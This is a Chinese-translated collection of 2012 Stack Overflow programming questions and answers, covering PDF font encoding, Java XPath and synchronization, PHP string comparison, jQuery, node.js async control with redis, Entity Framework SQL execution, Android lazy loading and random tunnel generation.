> 
> 赞同：1
> 
> 时间：2012-09-28T20:15:44.140
> 
> 标签：pdf, encoding, fonts, truetype

在解析 pdf 文件时，我的解析器遇到了一个 Tf 运算符，其字体字典中的 SubType 条目的值设置为 TrueType。不存在编码条目，设置了符号标志。

我的问题是：我如何将字符代码映射到没有编码的字符？

[PDF 参考](http://wwwimages.adobe.com/www.adobe.com/content/dam/Adobe/en/devnet/pdf/pdfs/pdf_reference_1-7.pdf)第5.5.5 节字符编码指出 TrueType 字体在字体文件的表格中表示内部数据。这些表格似乎可以帮助我映射字符代码。我做对了吗？如何从字体文件中提取这些信息？

从 PDF 中提取的字体文件给出了如下内容： ![在十六进制编辑器中查看的字体文件](../Images/a69eba680dbc0419b57d0e379c337013.png)

我阅读了 Apple 的文档[The True Type Font File](https://developer.apple.com/fonts/TTRefMan/RM06/Chap6.html#Directory)，但仍然不知道如何从这些表中提取这些信息。

任何帮助、链接或阅读建议将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T21:44:21.450

符号标志表示编码设置为 [0..255] 范围。每个字符代码都必须在此范围内。字体只为这些代码提供字形。

[这](http://www.microsoft.com/typography/fonts/)是一组关于 TrueType 和 OpenType 字体格式的资源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-22T10:07:03.657

您可以使用 freetype 库函数 FT_Get_Char_Index 将字符代码转换为字形索引。见[FT_Get_Char_Index](http://freetype.sourceforge.net/freetype2/docs/reference/ft2-base_interface.html#FT_Get_Char_Index)

您必须将 truetype 字体转储到文件并使用 freetype 加载它才能首先获得 FT_Face。

# java - 生成 XPATH 查询问题

> ID：12646807
> 
> 赞同：0
> 
> 时间：2012-09-28T20:15:53.580
> 
> 标签：java, xpath

我有一个 SOAP 响应如下

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Body>
<NTService.DisconnectResourceResult     xmlns="http://www.evolving.com/NumeriTrack/xsd">
<retData xmlns="">
<retCode>rcSuccess</retCode>
<retMsg/>
<resErrList/>
</retData>
</NTService.DisconnectResourceResult>
</soapenv:Body>
</soapenv:Envelope> 
```

我不擅长生成 XPATH 查询，但使用 SOAPUI 我能够获取 XPATH 查询以获取`retCode`如下：

```
//ns1:NTService.DisconnectResourceResult[1]/retData[1]/retCode[1]/text() 
```

在 Java 中，我试图获取`retCode`但无法获取输出。

```
XPath xpath = XPathFactory.newInstance().newXPath();
xpath.setNamespaceContext(new SoapNamespaceContext());

String     sxpath="//ns1:NTService.DisconnectResourceResult[1]/retData[1]/retCode[1]/text()";
System.out.println("sxpath is " + sxpath);
XPathExpression expr;
expr = xpath.compile(sxpath);
System.out.println("expr is " + expr);
Object result;
result = expr.evaluate(sb, XPathConstants.NODESET);
System.out.println("result is " + result);
NodeList nodes = (NodeList) result;
System.out.println("Length of result is " + nodes.getLength());
 for (int i = 0; i < nodes.getLength(); i++) {
     System.out.println(nodes.item(i).getNodeValue()); 
 } 
```

我也设置了命名空间。

```
public String getNamespaceURI(String prefix) {
        System.out.println("Prefix is " +prefix);
      if (prefix == null) throw new NullPointerException("Null prefix");
        else if ("ns1".equals(prefix)) {
            System.out.println("Returning http://www.evolving.com/NumeriTrack/xsd");
            return "http://www.evolving.com/NumeriTrack/xsd";
                    }
        else if ("n".equals(prefix)) {
            System.out.println("Returning http://schemas.xmlsoap.org/soap/envelope/");
            return "http://schemas.xmlsoap.org/soap/envelope/";
                    }
        else if ("xml".equals(prefix)) return XMLConstants.XML_NS_URI;
        return XMLConstants.NULL_NS_URI;
} 
```

`

谁能建议我从 SOAP 消息响应中获取 retCode。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T00:46:47.543

这是答案：

```
 Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File("D:\\Loic_Workspace\\Test2\\res\\test.xml"));

        System.out.println(doc.getElementsByTagName("retCode").item(0).getTextContent()); 
```

**您应该使用 .getTextContent() 方法。**

将根据需要输出**rcSuccess** :)

希望对你有帮助

# php - Preg 匹配大写和小写用户输入

> ID：12646810
> 
> 赞同：0
> 
> 时间：2012-09-28T20:16:28.717
> 
> 标签：php, regex

我正在开发一个有优惠券的购物车，店主告诉我，顾客似乎不愿意为已发行的优惠券使用合适的外壳，并且不断抱怨优惠券不起作用，这让员工很恼火。

我最初打算简单地使用 strtoupper() 用户输入，但这将要求所有者只使用大写的优惠券代码，这没有任何意义。

我想在用户输入上做一个 preg_match() ，如果所有字符都正确并完全忽略大小写，就让它匹配。但是唉......我不知道如何使用正则表达式来获得我需要的东西。

这就是我现在所拥有的：

```
strtoupper ($this->request->post['coupon']) 
```

正如我所说，这对来自 db 的大写优惠券代码非常有效，但会迫使所有者将所有代码大写。

任何帮助将不胜感激。

-V

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-28T20:20:45.273

只需将两者转换为相同的大小写并进行比较：

```
if(strtolower($input) == strtolower($check)) 
```

更好的是，用于[`strcasecmp()`](http://php.net/manual/en/function.strcasecmp.php)进行二进制安全的不区分大小写的字符串比较：

```
if (strcasecmp($input, $check) == 0) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T20:21:00.677

这取决于您如何查看优惠券代码。如果您正在运行数据库查询，SQL 和朋友允许您执行不区分大小写的查询。如果您将它们与例如配置文件一一进行比较，那么不要说`if (code_entered === valid_code)`，说`if (strtolower(code_entered) === strtolower(valid_code))`。否则，我们需要知道实际比较是如何发生的，因为这是重要的部分。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T20:22:37.703

> “这将要求所有者只使用大写的优惠券代码，这是没有意义的。”

从您描述您的情况的方式来看，将这些优惠券代码存储在一致的大小写（大写或小写）中以匹配客户输入的一致大小写（ 'd 或'd）实际上*似乎*是有意义的。`strtoupper``strtolower`

也就是说，正则表达式不区分大小写的匹配是使用`/i`修饰符实现的。

但是`strcasecmp()`，已经提出，很可能是一个更好的解决方案。

# java - 与 2 个对象的块同步不起作用

> ID：12646815
> 
> 赞同：1
> 
> 时间：2012-09-28T20:16:52.147
> 
> 标签：java, synchronized

我正在测试一个代码，其中我有 2 个方法，并且每个方法中的一个语句是同步的。

```
private final Object obj1 = new Object();
private final Object obj2 = new Object();

public void method1(int result)
{
 //there's a loop to create delay

 synchronized (obj1){
   sum = sum + result;
 }

 //there's a loop to create delay

}

public void method2(int result)
{
  //there's a loop to create delay

 synchronized (obj2){
   sum = sum - result;
 }

 //there's a loop to create delay

} 
```

我基本上在做的是我将结果添加到总和然后减去相同的数量然后打印总和。所以我的初始和最终金额应该是恒定的。

问题是当我使用 2 个差异对象作为锁时，我不知道为什么最终数量与初始数量不同。但是，当我使用“this”对象作为两个语句的锁时，它是不变的。但是使用“this”作为对象并没有比使用同步方法更快地执行时间。

我对同步概念仍然很陌生，因此不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:20:03.090

当您在`synchronize`块中指定一个对象时，该对象就像该块的锁一样`synchronize`使用：任何时候只有一个块可以使用锁对象。

当你使用两个*不同的*对象作为锁时，它们就变成了两个*不同的*锁：两个线程可以同时锁住它们——每个锁一个线程。这解释了结果不一致的原因：两个线程可以同时抓取两个单独的锁，并同时修改`sum`，导致计算不正确。

您应该使用单个锁来保护单个资源免受并发访问。这就是您使用`this`;时发生的情况。`obj1`如果您使用或同时使用`obj2`两个块，也会发生同样的情况`synchronize`，除非在这种情况下，您的对象的用户将无法通过在您的对象上同步并故意不释放锁来导致您的方法永远阻塞。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:17:50.040

如果您`synchronized`想在`obj1`.`obj2``sum`

否则，每个线程都会获得一个对象的锁定，并且它们可以同时执行操作。

每个线程在执行任何受保护的代码之前都会获取对象锁定。`T1`可能会同时获取锁，`Obj1`可能`T2`会`Obj2`同时获取锁并继续执行，这可能会产生不一致的结果。

# jquery - HTML/Jquery 隐藏+显示依赖

> ID：12646820
> 
> 赞同：0
> 
> 时间：2012-09-28T20:17:08.943
> 
> 标签：jquery, html, select, drop-down-menu, dependencies

所以我有一个下拉列表和几个复选框。下拉列表与用户只能选择一个选项的主要选择有关。复选框属于次要选择，用户可以选择任意数量的选项，但他们从下拉列表中选择的选项不会显示为选项之一。到目前为止，这是我的代码：[小提琴](http://jsfiddle.net/ZvJQz/)

因此，例如，如果用户从下拉列表中选择选项 1，则只有 option2-8 应可用作复选框。我想基本上隐藏 option1 并显示其余部分。我真的不知道这叫什么，所以我不知道要搜索什么或在哪里看。我想看看是否有某种 jquery 插件可以解决这个问题，但我应该怎么做呢？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:23:19.687

[检查此演示](http://jsfiddle.net/sushanth009/ZvJQz/8/)

你不需要插件。简单的 jQuery 就足够了

试试这个

```
$('#primary').on('change', function() {
    // Show all the options initially
    $('.secondary label').show();
    // Get the currently selected option
    var selected = $(this).val();
    // Hide the label that encases the option
    $('.secondary').find('input[type="checkbox"][value="'+ selected + '"]').closest('label').hide();

}).change();​ 
```

**更新代码**

为此，您需要创建一个复选框模板，该模板可用于在选择更改时填充设计..

```
$('#primary').on('change', function() {
    // Clone the checkbox template
    var $template = $('.template').clone();
    var selected = $(this).val();
    // Remove the selected option from cloned object
    $template.find('input[type="checkbox"][value="'+ selected + '"]').closest('label').remove(); 

    // Append to the DropDown
    $('.secondary').html( $template.html() );

}).change();​ 
```

[更新的小提琴](http://jsfiddle.net/sushanth009/ZvJQz/2/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T20:53:04.920

迈克尔，试试这个：

javascript

```
$(function(){
    $('#primary').on('change', function() {
        var $sec = $('.secondary'); 
        var idx = this.selectedIndex;
        $sec.find('input').attr('disabled', false).eq(idx).attr('disabled', true);
        $sec.find('label').removeClass('disabled').eq(idx).addClass('disabled');
    }).trigger('change');
}); 
```

CSS：

```
.disabled {
    color: gray;
} 
```

**[演示](http://jsfiddle.net/ZvJQz/3/)**

通过禁用而不是隐藏不需要的复选框，我略微偏离了简要说明。这可能不会让用户感到困惑。如果没有，那么修改代码以隐藏/显示很容易：

```
$('#primary').on('change', function() {
    $('.secondary').find('label').show().eq(this.selectedIndex).hide();
}).trigger('change'); 
```

**[演示](http://jsfiddle.net/ZvJQz/4/)**

# c - 如何查找数组中的元素个数

> ID：12646821
> 
> 赞同：3
> 
> 时间：2012-09-28T20:17:30.477
> 
> 标签：c

我有一个 int 数组，我需要找到其中的元素数。我知道它与 sizeof 有关，但我不确定如何准确使用它。例子

```
 int data2[]={a,b,c,d}; 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-28T20:18:22.123

使用数组，您可以：

```
int numElements = sizeof(data) / sizeof(data[0]); 
```

但这仅适用于数组，并且如果您将数组传递给函数则不起作用：此时数组衰减为指针，因此`sizeof`将返回指针的大小。

您会看到它包含在一个宏中：

```
#define ARRAY_LENGTH(x) (sizeof (x) / sizeof (x)[0]) 
```

# javascript - node.js + socket.io + 结果所需的多个数据库调用

> ID：12646822
> 
> 赞同：4
> 
> 时间：2012-09-28T20:17:37.127
> 
> 标签：javascript, node.js, asynchronous, redis, socket.io

我需要帮助。

一天以来，我一直在尝试使用 node.js 和 socket.io 进行异步编程。我知道我需要一些流量控制，但我似乎不明白如何正确实施它。

我有一个 redis 数据存储，它的模块存储在一个集合中，比如说“moda”，“modb”这些模块的实例是“moda:instances”，而在“modb:instances”中，这些实例的属性存储在“moda:instancea”中' 和 'modb:instanceb' 作为哈希。

我正在尝试获取以下json：

```
"moda": {"instancea": {"property1": "value1", "property2", "value2"}}, "modb": {"instanceb": {"property1": "value1"}} 
```

有人可以在正确的方向上给我一点推动吗？

这是我当前的代码：

```
var io = require('socket.io').listen(2000);
var redis = require('redis').createClient();
var http = require('http');
var async = require('async');
var step = require('step');

io.sockets.on('connection', function (socket) {

var notifications = require('redis').createClient();
notifications.subscribe("notification");
notifications.on("message", function (channel, message) {
  socket.send(message);
  console.log(channel + ':' + message);
});

socket.on('modules', function(params, callback) {
  var response = {};
  async.series([

  function (callback) {
    console.log('1>');
    redis.smembers('modules', function (err, modules) {
      async.forEachSeries(modules, function(module, moduleCallback) {
        response[module] = {}

        redis.smembers(module + ':instances', function(err, instances) {
          async.forEachSeries(instances, function(instance, instanceCallback) {
            response[module][instance] = {}
            console.log('2>' + module + ':' +instance);
            instanceCallback();
          });
          moduleCallback();
        });
      });
      callback();
    });
  },
  function (callback) {
    console.log('3');
    callback();
  }

], function() {
  console.log(JSON.stringify(response));
});

});

}); 
```

这段代码的输出是：

```
 info  - socket.io started
   debug - client authorized
   info  - handshake authorized JMMn1I8aiOMGCMPOhC11
   debug - setting request GET /socket.io/1/websocket/JMMn1I8aiOMGCMPOhC11
   debug - set heartbeat interval for client JMMn1I8aiOMGCMPOhC11
   debug - client authorized for 
   debug - websocket writing 1::
1>
3
{"moda":{}}
2>moda:instancea
2>moda:instanceb
2>modb:instancea 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T08:09:50.230

问题在于 forEachSeries 需要一个额外的回调作为第三个参数（在整个处理完成时调用）。您不能只在 forEachSeries 之后添加一些代码，希望它一旦完成就会被调用。

这是您修改的代码：

```
var response = {};
async.series([

function (callback) {
  console.log('1>');
  redis.smembers('modules', function (err, modules) {
    async.forEachSeries(modules, function(module, moduleCallback) {
      response[module] = {}

      redis.smembers(module + ':instances', function(err, instances) {
        async.forEachSeries(instances, function(instance, instanceCallback) {
          response[module][instance] = {}
          console.log('2>' + module + ':' +instance);
          instanceCallback();
        }, moduleCallback );
      });
    }, callback );
  });
},
function (callback) {
  console.log('3');
  callback();
}],
function() {
   console.log(JSON.stringify(response));
}); 
```

请注意回调和 moduleCallback 如何用作第三个参数。输出是：

```
1>
2>moda:instancea
2>moda:instanceb
2>modb:instancea
3
{"moda":{"instancea":{},"instanceb":{}},"modb":{"instancea":{}}} 
```

我想这是你所期望的。

补充说明：forEachSeries 将按顺序处理所有内容，下一个操作等待上一个操作完成。这将产生大量到 Redis 的往返。forEach 在这里应该更有效地利用流水线。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-29T20:19:56.233

还可以看看 Promise 概念，使用 Promise 配置流程更具可读性。

首先，您需要准备您正在使用的 redis 方法的承诺版本：

```
var promisify = require('deferred').promisify;
var RedisClient = require('redis').RedisClient;
RedisClient.prototype.psmembers = promisify(RedisClient.prototype.smembers); 
```

然后，您可以将流程构建为：

```
console.log('1>');
redis.psmembers('modules').map(function (module) {
  response[module] = {};
  return redis.psmembers(module + ':instances').map(function (instance) {
    response[module][instance] = {};
    console.log('2>' + module + ':' +instance);
  });
}).end(function () {
  console.log('3');
  console.log(JSON.stringify(response));
}); 
```

Check: [https://github.com/medikoo/deferred](https://github.com/medikoo/deferred)

# java - 默认覆盖处理程序

> ID：12646823
> 
> 赞同：2
> 
> 时间：2012-09-28T20:17:37.210
> 
> 标签：java, overriding

有没有办法定义一个可以处理任何未处理方法的默认或后备覆盖方法？

我问这个的原因是因为我已经创建了一个类来覆盖函数库中不断变化的类。为了成功编译类，必须定义和覆盖所有方法，但我真的不想在每次更新时都重新编码我的类。

以下是所写内容的示例：

```
public class CommandSignsPlayerProxy implements Player {

    private Player proxy;
    private boolean silent;

    public CommandSignsPlayerProxy(Player targetPlayer) {
        this.proxy = targetPlayer;
    }

    public boolean isSilent() {
        return silent;
    }

    public void setSilent(boolean silent) {
        this.silent = silent;
    }

    @Override
    public void abandonConversation(Conversation conversation, ConversationAbandonedEvent details) {
        proxy.abandonConversation(conversation, details);
    }

    // This function is basically the only one that NEEDS overriding
    @Override
    public void sendMessage(String message) {
        if (!silent)
            proxy.sendMessage(message);
    }

    @Override
    public void setFlySpeed(float arg0) throws IllegalArgumentException {
        proxy.setFlySpeed(arg0);
    }

} 
```

在实际代码中，还有另外 50 多个重写函数。那么有没有办法制作一个覆盖的自动处理`function_name()`程序`proxy.function_name()`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:22:54.133

[动态代理](http://docs.oracle.com/javase/1.4.2/docs/guide/reflection/proxy.html)可能能够做到这一点。从文档中：

> 动态代理类是实现在运行时指定的接口列表的类，这样通过类实例上的一个接口的方法调用将被编码并通过统一接口分派到另一个对象。因此，动态代理类可用于为接口列表创建类型安全的代理对象，而无需预先生成代理类，例如使用编译时工具。
> 
> 动态代理类实例上的方法调用被分派到实例的调用处理程序中的单个方法，并且它们使用标识被调用方法的 java.lang.reflect.Method 对象和包含对象类型的数组进行编码论据。

# ruby-on-rails - Rails：使用符号解决组的歧义

> ID：12646827
> 
> 赞同：5
> 
> 时间：2012-09-28T20:17:44.153
> 
> 标签：ruby-on-rails

假设我有两个表，`Parent`并且`Child`它们都有一个名为 的字段`name`，如果我这样做：

`Parent.join(:child).group(:name)`

我会收到一条错误消息，指出该字段存在歧义`name`。我可以做以下

`Parent.join(:child).group('parents.name')`

要解决它，但如果可能的话，我更喜欢使用符号。那么，是吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:44:45.253

您可以重新定义范围以自动添加表名前缀

```
class Parent < ActiveRecord::Base
  class << self; alias_method :old_group, :group; end
  scope :group, lambda { |g|
    old_group("#{table_name}.#{g}")
  }
end

Parent.join(:child).group(:name) 
```

# c# - 在 WebAPI 中访问 HttpRequestMessage 属性集合时的性能问题

> ID：12646828
> 
> 赞同：1
> 
> 时间：2012-09-28T20:17:45.187
> 
> 标签：c#, .net, performance, caching, asp.net-web-api

使用 ASP.NET MVC4，我在 WebAPI 项目中创建了一个 DelegatingHandler。我使用 Handler 将一些数据插入到 HttpRequestMessage 属性集合中，以便 Http 管道的后面部分（例如其他处理程序、控制器）可以访问该数据。

例子：

```
var httpRequest = (HttpRequestMessageProperty) request.Properties["httpRequest"];
httpRequest.Headers["MY_DATA"] = "some data"; 
```

我想测试这对 WebAPI 请求处理的吞吐量的影响，所以我创建了一个控制台应用程序，它在 Action 委托中实例化一个 HttpClient，发送一个请求，并在发送下一个请求之前等待响应。我使用此处描述的性能测量策略计算此操作委托在 5 秒窗口内成功执行的次数：http: [//www.codeproject.com/Articles/61964/Performance-Tests-Precise-Run-Time-Measurements-无线](http://www.codeproject.com/Articles/61964/Performance-Tests-Precise-Run-Time-Measurements-wi)

我观察到的是，在执行从 Properties 集合中检索 httpRequest 的单行时，性能上有很大的损失。如果没有这行代码，我会在 5 秒内看到 >700 次完成。当我添加该行时，它会在 5 秒内降至 <20 次。

有没有其他人经历过这个？我应该使用不同的方法来缓存整个 Http 管道中可用的单个请求长度的数据吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T15:11:14.000

将项目添加到 Current HttpContext Items 集合似乎有效，并且对我正在测量的性能没有明显影响。

```
HttpContext.Current.Items.Add(REQUEST_ID_KEY, request.GetCorrelationId().ToString()); 
```

# python - ValueError: int() 以 10 为底的无效文字：'T'

> ID：12646830
> 
> 赞同：0
> 
> 时间：2012-09-28T20:17:52.413
> 
> 标签：python, list-comprehension

在这里，我有两行代码在 ipython 中运行在一个大型文本文件上，我之前读入了制表符分隔的值，并且已经按行拆分：

```
In [30]: data = [(int(e[0]),e[1],e[2],int(e[3])) for e in d.split('\t') for d in dat]
---------------------------------------------------------------------------
ValueError                                Traceback (most recent call last)
/home/max/verk/data/build/x86_64/bin/ipython in <module>()
----> 1 data = [(int(e[0]),e[1],e[2],int(e[3])) for e in d.split('\t') for d in dat]

ValueError: invalid literal for int() with base 10: 'T'

In [31]: data = [(int(e[0]),e[1],e[2],int(e[3])) for e in (d.split('\t') for d in dat)]

In [32]: len(data)
Out[32]: 173503

In [33]: 
```

......那么这里发生了什么？为什么第 30 行的代码不起作用，为什么当解决方案似乎与列表理解有关时，错误看起来像是在将字符串转换为 int 时遇到问题？

# c# - 执行通过实体框架输出（打印）的 SQL 查询

> ID：12646833
> 
> 赞同：2
> 
> 时间：2012-09-28T20:18:00.600
> 
> 标签：c#, sql, entity-framework-4

我得到了一个 SQL 查询，它整齐地输出（PRINT）数据，棘手的部分是我需要通过我已经使用 EF4.1 的应用程序来执行它（并且显然稍后使用输出）。

这是我到目前为止所拥有的。

```
 string sqlQuery = string.Empty;
        _ctx.Connection.Open();
        DbCommand com = _ctx.Connection.CreateCommand();

        sqlQuery = @"declare @note varchar(1000)
                    set @note = (select
                    'Client: '+cast([NO_CLIENT] as varchar)+' - '+TABLE1.[nom]+
                    CHAR(13)+CHAR(10)+
                    'Adr_1 '+[ADR_1]+
                    CHAR(13)+CHAR(10)+
                    'Adr_2 '+[ADR_2]+
                    CHAR(13)+CHAR(10)+
                    'Adr_3 '+[ADR_3]+
                    CHAR(13)+CHAR(10)+
                    'Adr_4 '+[ADR_4]+
                    CHAR(13)+CHAR(10)+
                    'Contact: '+[CONTACT]+
                    CHAR(13)+CHAR(10)+
                    'Postal Code|Code Postal: '+substring([CODE_POSTAL],1,3)+' '+substring([CODE_POSTAL],4,3)+
                    CHAR(13)+CHAR(10)+
                    'Tel No: '+[TELEPHONE]+' Ext.: '+[POSTE_EXTENSION]+
                    CHAR(13)+CHAR(10)+
                    'Fax No: '+[NO_FAX]+
                    CHAR(13)+CHAR(10)+
                    'Clinic: '+[CLINIQUE_QUI_FACTURE]+
                    CHAR(13)+CHAR(10)+
                    'Langu.: '+ case [LANGUE] when 1 then 'Fr' when 2 then 'En' Else 'N/A'  end+
                    CHAR(13)+CHAR(10)+
                    case [ACTIF] when 0 then 'Non-Active|Inactif' when 1 then 'Active|Actif' Else 'N/A' end+
                    CHAR(13)+CHAR(10)+
                    'Account Man.|Chargé Cpte: '+CAST(TABLE1.[NO_VENDEUR_1] AS VARCHAR)+' - '+clve.[NOM]+
                    CHAR(13)+CHAR(10)+
                    'DATE REGISTERED|DATE ENREGISTREMENT: '+[DATE_ENREGISTREMENT]+
                    CHAR(13)+CHAR(10)+
                    '---------- MARKETING INFO ----------'+
                    CHAR(13)+CHAR(10)+
                    'Company|Cie: '+[TABLE2_NOM]+
                    CHAR(13)+CHAR(10)+
                    'Contact: '+[TABLE2_CONTACT]+
                    CHAR(13)+CHAR(10)+
                    'Tel.: '+[TABLE2_TELEPHONE]+
                    CHAR(13)+CHAR(10)+
                    'Adr_1: '+[TABLE2_ADR1]+
                   CHAR(13)+CHAR(10)+
                   'Adr_2: '+[TABLE2_ADR2]+
                   CHAR(13)+CHAR(10)+
                   'Adr_3: '+[TABLE2_ADR3]+
                   CHAR(13)+CHAR(10)+
                   'Adr-4: '+[TABLE2_ADR4]+
                   CHAR(13)+CHAR(10)+
                   'City|Ville: '+[TABLE2_VILLE_PROV]+
                   CHAR(13)+CHAR(10)+
                   'Postal Code|Code Postal: '+substring([TABLE2_CODE_POSTAL],1,3)+' '+substring([TABLE2_CODE_POSTAL],4,3)+
                   CHAR(13)+CHAR(10)+
                   'Fax No: '+[TABLE2_FAX_1]+
                   CHAR(13)+CHAR(10)+
                   'Ext.: '+[TABLE2_FAX_1_POSTE]+
                   CHAR(13)+CHAR(10)+
                   'Fax 2 :'+[TABLE2_FAX_2]+
                   CHAR(13)+CHAR(10)+
                   'Email1: '+[TABLE2_EMAIL1]+
                   CHAR(13)+CHAR(10)+
                   'Email2: '+[TABLE2_EMAIL2]

                    FROM TABLE1 
                        left join TABLE3 on TABLE1.no_vendeur_1 = TABLE3.no_vendeur
                        where [NO_CLIENT] = 2003)

                    print @note

                ";

        com.CommandText = @sqlQuery;
        DbDataReader rd = com.ExecuteReader(); 
```

查询在 SQL Management Studio 中执行得很好，但是当应用程序运行它时我得到了这个异常：（看起来它正在以某种方式解析它）

```
The query syntax is not valid. Near term '@note', line 1, column 14. 
```

你认为我做错了什么？（可能一切都大声笑）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:21:15.997

首先，我很确定您不能将*语句*`Print`作为`SqlReader`. 我相信如果您执行以下操作，它将起作用：

```
select @note = 
```

此外，我会将您的 SQL 语句更改为（我的偏好）：

```
select @note = 
```

代替

```
set @note = 
```

**更新 1**

所以我做了以下事情：

```
using (SqlConnection con = new SqlConnection(@"Data Source=localhost\sqlexpress;
                     Integrated Security=SSPI;MultipleActiveResultSets=true"))
{
  con.Open();
  using (SqlCommand com = new SqlCommand(string.Empty, con))
  {
    string blah = @"declare @note varchar(1000) 
      set @note = 'asdf' 
      select @note";
    com.CommandText = blah;
    com.ExecuteReader();
  }
} 
```

它执行没有问题。所以很可能是第 1 行有问题（如错误状态），DbCommand 解析不正确，或者您未提供的代码正在更改 DbCommand。

此外，如果您使用的是实体框架，*为什么要完全绕过它*而不是使用它来创建相同的东西？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T21:38:41.967

这就是我最终做的事情：

```
var r = _ctx.ExecuteStoreQuery<string>(@sqlQuery).FirstOrDefault(); 
```

sqlQuery*声明*并*设置***@note**的值，最后*选择*它。

r 将包含纯文本。

这为我指明了正确的方向：[ExecuteStoreCommand 返回 -1 、 EntityFramework 、 C#？](https://stackoverflow.com/questions/7750587/executestorecommand-returns-1-entityframework-c)

# ios - 目标中没有 armv6 时 Xcode 4.5 armv6 错误？

> ID：12646834
> 
> 赞同：0
> 
> 时间：2012-09-28T20:18:06.337
> 
> 标签：ios, xcode, armv6

你好，

我目前收到以下错误。我已经尝试过之前在其他论坛上发布的所有内容。这是 Xcode 4.5 我知道它并不真正支持 armv6，我尝试手动添加它，但它仍然出现。

我尝试将“仅构建活动架构”切换为“否”，并收到超过 100 个有关 armv6 的错误。

我觉得我已经尝试了人们发布的所有内容，但似乎没有任何东西可以解决问题！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T18:39:04.790

您可能需要检查您的目标支持的最低 iOS 版本是否至少为 iOS 4.3。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-02T07:44:47.967

检查“有效架构”是否有任何 armv6 痕迹以及项目和目标的构建设置中的“架构”。

# android - 是否可以延迟加载具有多个视图的滚动视图？

> ID：12646835
> 
> 赞同：1
> 
> 时间：2012-09-28T20:18:07.073
> 
> 标签：android

所以，假设我已经设置好了我的活动，它会加载 Facebook 名称和用户以及布局中的其他一些东西，我只是为每个 facebook 用户添加一个布局。

所以我有一个巨大的滚动视图，每个用户都有一行。本质上是一个列表视图。

这最多可以容纳 250 个用户，这会导致相当长的加载时间。

现在，问题是，如果我想将其转换为内置延迟加载的列表视图，还有**很多需要更改的地方。**有没有办法在滚动视图中实现延迟加载？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:57:06.420

在可滚动视图中使用`ListView`and`Adapter` *是*延迟加载。这是正确的解决方案，而且很容易设置。做任何其他事情只会给你带来更多的问题。采用 SDK 为您提供的东西，而不是尝试自己实现它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:41:32.787

也许您可以缓存上次加载的结果，并首先显示这些结果。然后你可以慢慢刷新每一帧。

# service - 用服务实现责任链

> ID：12646841
> 
> 赞同：0
> 
> 时间：2012-09-28T20:18:24.330
> 
> 标签：service, chain

我正在考虑使用 Web 服务作为处理程序来实现责任链模式的平台中立（即不是 .NET MEF）技术。我希望能够通过部署新服务而不是编译新的 CoR 代码来添加更多的 CoR 处理程序，只需更改配置信息。似乎挑战将是管理有关可用处理程序的元数据并确保处理程序符合接口。

我的问题：关于如何安全地确保的任何想法： 1\. Web 服务正在实现接口 2\. Web 服务正在实现基类行为，例如调用后继

因为，在编译后的代码中，我可以拥有类型安全性，因此知道任何处理程序都派生自抽象基类，以确保我想要的接口和行为。服务领域似乎缺少这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T06:53:48.820

这似乎是一个有效的问题，但却是一个相当简单的问题。

即使您稍后在运行时加载原始代码以前从未见过的代码，您仍然可以得到打字系统的保护。

我认为这里的首选方法是使用带有实施者列表（您的链）的属性文件。然后在代码中，您将必须有一种方法在运行时实例化每个处理程序的实例以构造链。当你构造实例时，你必须检查它的类型。例如，在 Java 中，这将采用 instanceof 的形式（通常是可憎的，但您会获得加载场景的通行证）或 isAssignableFrom。在Objective C 中，它符合ConformsToProtocol。

如果没有，则无法使用，您可以将错误吐出到控制台。

# algorithm - 生成随机隧道

> ID：12646842
> 
> 赞同：6
> 
> 时间：2012-09-28T20:18:28.183
> 
> 标签：algorithm, random

我们可以使用什么方法来生成随机隧道，类似于[经典直升机游戏中](http://www.helicoptergame.net/)的方法？除此之外，它应该是平滑的并允许您在其中导航，同时看起来尽可能自然（不太对称但也不会过度扭曲），它还应该：

1.  最重要的是 - 是无限的，让我可以及时控制它的厚度 - 在我认为合适的时候让它变窄或变宽；
2.  理想情况下，应该可以高效地生成平滑曲线，而不是上面游戏中的矩形；
3.  我应该能够提前知道它的界限是什么，这样我就可以检测到碰撞并在隧道内产生能量；
4.  欢迎任何其他可以让您对其进行更多控制或提供优化可能性的属性。

**注意：** 我不是在问哪个最好或该游戏使用什么，这可能会引发广泛的讨论并且会是主观的，我只是要求其他人知道或以前使用过甚至认为它们可能有效的一些方法。仅此而已，我可以从那里拿走它。

还在[gamedev 上问过](https://gamedev.stackexchange.com/questions/37887/generating-random-tunnels)。我认为它适合这两个地方，因为它既是一个算法问题，也是一个游戏开发问题，IMO。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T20:52:24.530

我认为您可以将[贝塞尔曲线](http://en.wikipedia.org/wiki/B%C3%A9zier_curve)用于隧道壁，因为它们具有曲线的每一端都与该端最后两个控制点之间的线段相切的特性。这意味着可以懒惰地生成曲线，随时添加它们，而不会产生尖角。您只需要缓冲一个屏幕外片段。一旦它的最左边出现在屏幕上，就创建下一个屏幕外片段。

